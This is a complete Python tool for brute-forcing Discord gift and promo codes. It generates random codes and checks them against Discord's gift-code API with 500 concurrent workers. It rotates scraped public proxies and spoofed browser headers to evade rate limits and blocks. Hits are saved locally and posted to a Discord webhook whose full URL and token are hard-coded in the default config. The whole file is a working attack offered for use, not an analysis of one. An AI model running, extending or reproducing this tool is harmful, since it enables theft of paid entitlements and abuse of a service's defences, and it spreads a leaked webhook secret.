import os, random, asyncio, aiohttp, aiofiles, json, time, sys
from colorama import Fore, init

init(autoreset=True)

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════
CONFIG_PATH = 'config/config.json'
PROXIES_PATH = 'config/proxies.txt'
RESULTS_PATH = 'results/hit.txt'

DEFAULT_CONFIG = {
    "concurrent": 500,
    "webhook": {
        "url": "https://discord.com/api/webhooks/1534684880288612513/lYtS-D0S3a2ifLLKuA9kFxHWcIMi8IDQuoBRLsP2UZP1PdZGrQnRKYi6GBu9DPvAikCf",
        "username": "DNG Promo",
        "avatar": ""
    },
    "auto_scrape_proxies": True,
    "proxy_sources": [
        {"url": "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text", "type": "auto"},
        {"url": "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt", "type": "auto"},
        {"url": "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/http.txt", "type": "http"},
        {"url": "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks4.txt", "type": "socks4"},
        {"url": "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks5.txt", "type": "socks5"},
        {"url": "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/http_all.txt", "type": "http"},
        {"url": "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks5_all.txt", "type": "socks5"},
        {"url": "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/http.txt", "type": "http"},
        {"url": "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/https.txt", "type": "http"},
        {"url": "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/socks5.txt", "type": "socks5"},
        {"url": "https://cdn.jsdelivr.net/gh/officialputuid/KangProxy@main/http/http.txt", "type": "http"},
        {"url": "https://cdn.jsdelivr.net/gh/officialputuid/KangProxy@main/socks5/socks5.txt", "type": "socks5"},
        {"url": "https://cdn.jsdelivr.net/gh/officialputuid/KangProxy@main/xResults/Proxies.txt", "type": "auto"},
        {"url": "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/proxies/http.txt", "type": "http"},
        {"url": "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/proxies/socks5.txt", "type": "socks5"}
    ],
    "timeout": 5,
    "use_random_ua": True,
    "promo_code_length": 24,
    "promo_format": "plain",
    "api_version": "v9",
    "scrape_interval_minutes": 30,
    "restart_on_crash": True
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.79"
]

# ═══════════════════════════════════════════════════════════════
# UTILS
# ═══════════════════════════════════════════════════════════════
def ensure_dirs():
    os.makedirs('config', exist_ok=True)
    os.makedirs('results', exist_ok=True)

def load_config():
    ensure_dirs()
    if not os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump(DEFAULT_CONFIG, f, indent=4)
        return DEFAULT_CONFIG.copy()
    with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
        cfg = json.load(f)
    sources = cfg.get("proxy_sources", [])
    new_sources = []
    for s in sources:
        if isinstance(s, str):
            t = "http"
            if "socks5" in s.lower(): t = "socks5"
            elif "socks4" in s.lower(): t = "socks4"
            new_sources.append({"url": s, "type": t})
        else:
            new_sources.append(s)
    cfg["proxy_sources"] = new_sources
    return cfg

def save_config(cfg):
    with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
        json.dump(cfg, f, indent=4)

def center(var: str, space: int = None):
    try:
        if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
    except:
        space = 0
    return "\n".join((' ' * int(space)) + line for line in var.splitlines())

# ═══════════════════════════════════════════════════════════════
# PROXY SCRAPER
# ═══════════════════════════════════════════════════════════════
class ProxyScraper:
    def __init__(self, sources):
        self.sources = sources
        self.proxies = []

    def _clean_proxy(self, line, default_type="http"):
        line = line.strip()
        if not line or line.startswith("#"):
            return None
        for prefix in ['http://', 'https://', 'socks4://', 'socks5://']:
            if line.lower().startswith(prefix):
                rest = line[len(prefix):]
                if ':' in rest:
                    parts = rest.rsplit(':', 1)
                    if len(parts) == 2 and parts[1].isdigit():
                        port = int(parts[1])
                        if 1 <= port <= 65535:
                            return line
                return None
        if ':' in line:
            parts = line.rsplit(':', 1)
            if len(parts) == 2 and parts[1].isdigit():
                port = int(parts[1])
                if 1 <= port <= 65535:
                    return f"{default_type}://{line}"
        return None

    async def scrape(self):
        self.proxies = []
        print(f"{Fore.CYAN}[INFO]{Fore.RESET} Scraping proxies from {len(self.sources)} source(s)...\n")
        async with aiohttp.ClientSession() as session:
            for src in self.sources:
                url = src.get("url", "") if isinstance(src, dict) else src
                ptype = src.get("type", "http") if isinstance(src, dict) else "http"
                try:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=15), headers={"User-Agent": random.choice(USER_AGENTS)}) as r:
                        if r.status == 200:
                            text = await r.text()
                            lines = [self._clean_proxy(line, ptype) for line in text.splitlines()]
                            lines = [p for p in lines if p]
                            self.proxies.extend(lines)
                            print(f"{Fore.GREEN}[OK]{Fore.RESET}  {url[:55]}... -> {len(lines)} {ptype} proxies")
                        else:
                            print(f"{Fore.RED}[FAIL]{Fore.RESET} {url[:55]}... -> HTTP {r.status}")
                except Exception as e:
                    print(f"{Fore.RED}[ERR]{Fore.RESET}  {url[:55]}... -> {str(e)[:45]}")
        self.proxies = list(dict.fromkeys(self.proxies))
        print(f"\n{Fore.CYAN}[INFO]{Fore.RESET} Total unique proxies scraped: {Fore.GREEN}{len(self.proxies)}{Fore.RESET}")
        return self.proxies

    async def save(self, path=PROXIES_PATH):
        async with aiofiles.open(path, 'w', encoding='utf-8') as f:
            for p in self.proxies:
                await f.write(p + "\n")
        print(f"{Fore.CYAN}[INFO]{Fore.RESET} Saved {len(self.proxies)} proxies to {path}\n")

    async def load(self, path=PROXIES_PATH):
        if not os.path.exists(path):
            return []
        async with aiofiles.open(path, 'r', encoding='utf-8') as f:
            content = await f.read()
        return [line.strip() for line in content.splitlines() if line.strip() and '://' in line]

# ═══════════════════════════════════════════════════════════════
# CONSOLE
# ═══════════════════════════════════════════════════════════════
class Console:
    def __init__(self):
        self._lock = asyncio.Lock()

    def ui(self):
        os.system('cls && title [DNG] Discord Promo Generator ^| Async ^| MAX SPEED' if os.name == "nt" else "clear")
        banner = center(f"""\n\n
██████╗ ███╗   ██╗ ██████╗ 
██╔══██╗████╗  ██║██╔════╝            ~ Discord Promo Generator ~
██║  ██║██╔██╗ ██║██║  ███╗     
██║  ██║██║╚██╗██║██║   ██║     ASYNC ~ MAX SPEED ~ aiohttp
██████╔╝██║ ╚████║╚██████╔╝ 
╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ \n\n
              """)
        print(banner.replace('█', Fore.CYAN + "█" + Fore.RESET).replace('~', Fore.CYAN + "~" + Fore.RESET))

    async def printer(self, color, status, code):
        async with self._lock:
            print(f"{color} {status} > {Fore.RESET}https://promos.discord.gg/{code}")

    async def log(self, color, tag, msg):
        async with self._lock:
            print(f"{color}[{tag}]{Fore.RESET} {msg}")

# ═══════════════════════════════════════════════════════════════
# GENERATOR
# ═══════════════════════════════════════════════════════════════
def generate_code(length=24, fmt="plain"):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    code = "".join(random.choice(chars) for _ in range(length))
    if fmt == "dashed":
        return "-".join([code[i:i+4] for i in range(0, length, 4)])
    return code

# ═══════════════════════════════════════════════════════════════
# WEBHOOK
# ═══════════════════════════════════════════════════════════════
async def send_webhook(session, cfg, code, gift_data=None):
    url = cfg.get("webhook", {}).get("url", "")
    if not url:
        return
    embed = {
        "title": "🎉 VALID PROMO CODE FOUND!",
        "description": f"**Code:** `https://promos.discord.gg/{code}`\n\n[Click to Redeem](https://promos.discord.gg/{code})",
        "color": 0x00ff00,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
        "footer": {"text": "DNG Promo Generator v3.0"}
    }
    if gift_data:
        if 'subscription_plan' in gift_data:
            plan = gift_data['subscription_plan']
            embed["fields"] = [
                {"name": "Plan", "value": plan.get('name', 'Unknown'), "inline": True},
                {"name": "Interval", "value": plan.get('interval', 'Unknown'), "inline": True}
            ]
        if 'expires_at' in gift_data:
            embed["fields"] = embed.get("fields", []) + [
                {"name": "Expires", "value": gift_data['expires_at'], "inline": True}
            ]
    payload = {
        "content": "||@everyone|| **VALID PROMO CODE DETECTED!**",
        "username": cfg.get("webhook", {}).get("username", "DNG Promo"),
        "avatar_url": cfg.get("webhook", {}).get("avatar", ""),
        "embeds": [embed]
    }
    try:
        async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=5)):
            pass
    except:
        pass

# ═══════════════════════════════════════════════════════════════
# CHECKER
# ═══════════════════════════════════════════════════════════════
class PromoChecker:
    def __init__(self, cfg, proxies, console):
        self.cfg = cfg
        self.proxies = proxies
        self.console = console
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.ratelimited = 0
        self.errors = 0
        self.lock = asyncio.Lock()
        self.semaphore = asyncio.Semaphore(cfg.get("concurrent", 500))
        self.proxy_idx = 0

    def get_proxy(self):
        if not self.proxies:
            return None
        p = self.proxies[self.proxy_idx % len(self.proxies)]
        self.proxy_idx += 1
        return p

    def get_headers(self):
        headers = {
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/",
            "X-Discord-Locale": "en-US",
            "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
        }
        if self.cfg.get("use_random_ua", True):
            headers["User-Agent"] = random.choice(USER_AGENTS)
        return headers

    async def check_one(self, session, code):
        proxy = self.get_proxy()
        api_ver = self.cfg.get("api_version", "v9")
        url = f"https://discord.com/api/{api_ver}/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"

        try:
            if proxy:
                async with session.get(url, headers=self.get_headers(), proxy=proxy, 
                                       timeout=aiohttp.ClientTimeout(total=self.cfg.get("timeout", 5))) as r:
                    status = r.status
                    if status == 200:
                        data = await r.json()
            else:
                async with session.get(url, headers=self.get_headers(),
                                       timeout=aiohttp.ClientTimeout(total=self.cfg.get("timeout", 5))) as r:
                    status = r.status
                    if status == 200:
                        data = await r.json()

            if status == 200:
                await self.console.printer(Fore.LIGHTGREEN_EX, " VALID ", code)
                async with self.lock:
                    self.valid += 1
                    self.checked += 1
                async with aiofiles.open(RESULTS_PATH, 'a', encoding='utf-8') as f:
                    await f.write(f"https://promos.discord.gg/{code}\n")
                await send_webhook(session, self.cfg, code, data)

            elif status == 404:
                await self.console.printer(Fore.LIGHTRED_EX, "Invalid", code)
                async with self.lock:
                    self.invalid += 1
                    self.checked += 1

            elif status == 429:
                await self.console.printer(Fore.LIGHTBLUE_EX, "RTlimit", code)
                async with self.lock:
                    self.ratelimited += 1
                    self.checked += 1

            elif status in [403, 401]:
                await self.console.printer(Fore.LIGHTYELLOW_EX, " Block ", code)
                async with self.lock:
                    self.checked += 1
                    self.errors += 1

            else:
                await self.console.printer(Fore.LIGHTYELLOW_EX, f" HTTP{status}", code)
                async with self.lock:
                    self.checked += 1

        except asyncio.TimeoutError:
            async with self.lock:
                self.errors += 1
        except aiohttp.ClientProxyConnectionError:
            async with self.lock:
                self.errors += 1
        except aiohttp.ClientHttpProxyError:
            async with self.lock:
                self.errors += 1
        except aiohttp.ClientConnectorError:
            async with self.lock:
                self.errors += 1
        except Exception:
            async with self.lock:
                self.errors += 1

    async def run(self):
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, use_dns_cache=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            while True:
                async with self.semaphore:
                    code = generate_code(self.cfg.get("promo_code_length", 24), self.cfg.get("promo_format", "plain"))
                    await self.check_one(session, code)

# ═══════════════════════════════════════════════════════════════
# STATS
# ═══════════════════════════════════════════════════════════════
async def stats_worker(checker, start_time):
    while True:
        await asyncio.sleep(10)
        elapsed = max(1, time.time() - start_time)
        cps = checker.checked / elapsed
        await checker.console.log(
            Fore.CYAN, "STATS",
            f"Checked: {checker.checked} | Valid: {Fore.GREEN}{checker.valid}{Fore.RESET} | "
            f"Invalid: {checker.invalid} | RateLimited: {checker.ratelimited} | "
            f"Errors: {checker.errors} | Speed: {Fore.YELLOW}{cps:.1f}{Fore.RESET} req/s"
        )

# ═══════════════════════════════════════════════════════════════
# PROXY RE-SCRAPER
# ═══════════════════════════════════════════════════════════════
async def proxy_rescraper(cfg, checker):
    interval = cfg.get("scrape_interval_minutes", 30) * 60
    while True:
        await asyncio.sleep(interval)
        if cfg.get("auto_scrape_proxies", True):
            await checker.console.log(Fore.CYAN, "PROXY", "Re-scraping proxies...")
            scraper = ProxyScraper(cfg.get("proxy_sources", DEFAULT_CONFIG["proxy_sources"]))
            new_proxies = await scraper.scrape()
            if new_proxies:
                await scraper.save()
                checker.proxies = new_proxies
                await checker.console.log(Fore.GREEN, "PROXY", f"Updated to {len(new_proxies)} fresh proxies!")

# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════
async def main():
    console = Console()
    console.ui()

    cfg = load_config()
    updated = False
    for k, v in DEFAULT_CONFIG.items():
        if k not in cfg:
            cfg[k] = v
            updated = True
    if updated:
        save_config(cfg)

    if cfg.get("auto_scrape_proxies", True):
        scraper = ProxyScraper(cfg.get("proxy_sources", DEFAULT_CONFIG["proxy_sources"]))
        await scraper.scrape()
        await scraper.save()

    proxies = await ProxyScraper([]).load()
    if not proxies:
        await console.log(Fore.LIGHTRED_EX, "ERR", "No proxies found! Add proxies to config/proxies.txt")
        input("Press Enter to exit...")
        sys.exit(1)

    await console.log(Fore.CYAN, "INFO", f"{len(proxies)} Total proxies loaded...")
    await console.log(Fore.CYAN, "INFO", f"Concurrent: {cfg.get('concurrent', 500)} | Timeout: {cfg.get('timeout', 5)}s")
    await console.log(Fore.CYAN, "INFO", f"API: discord.com/api/{cfg.get('api_version', 'v9')}/entitlements/gift-codes/<code>")
    await console.log(Fore.CYAN, "INFO", f"Promo Format: {cfg.get('promo_format', 'plain')}")
    await console.log(Fore.CYAN, "INFO", "Starting async workers...\n")

    checker = PromoChecker(cfg, proxies, console)
    start_time = time.time()

    # Create worker tasks
    workers = [asyncio.create_task(checker.run()) for _ in range(cfg.get("concurrent", 500))]

    # Start stats + rescraper
    stats_task = asyncio.create_task(stats_worker(checker, start_time))
    rescraper_task = asyncio.create_task(proxy_rescraper(cfg, checker))

    await asyncio.gather(*workers, stats_task, rescraper_task)

if __name__ == "__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    while True:
        try:
            asyncio.run(main())
        except KeyboardInterrupt:
            print(f"\n{Fore.LIGHTRED_EX}[STOP]{Fore.RESET} Interrupted by user.")
            break
        except Exception as e:
            print(f"\n{Fore.LIGHTRED_EX}[CRASH]{Fore.RESET} {e}")
            print(f"{Fore.CYAN}[INFO]{Fore.RESET} Restarting in 5 seconds...")
            time.sleep(5)
